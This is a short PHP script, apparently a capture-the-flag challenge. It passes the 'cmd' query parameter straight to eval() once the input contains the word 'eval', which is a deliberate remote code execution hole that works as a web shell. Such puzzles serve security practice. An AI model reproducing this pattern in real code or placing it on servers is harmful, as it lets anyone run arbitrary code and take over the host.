<?php
echo 'eval($_GET["cmd"]);';
if(!preg_match('/eval/i',$_GET['cmd'])){
    die("hacker");
}
else{
    eval($_GET["cmd"]);
}
?>